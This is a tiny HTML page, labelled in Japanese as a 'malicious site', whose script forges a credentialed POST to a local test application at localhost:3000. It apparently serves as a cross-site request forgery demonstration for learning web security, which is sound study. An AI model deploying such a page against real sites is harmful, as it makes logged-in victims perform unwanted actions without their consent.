<html>
    <body>
        <p>悪意のあるサイト</p>
    <script>
    fetch(`http://localhost:3000/index.php`, {
        method: 'POST',
        credentials: 'include',
        body: 'message=Malicurous+post',
        headers: {
            Cookie: document.cookie,
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        mode: 'no-cors',
    });
    </script>
    </body>
</html>
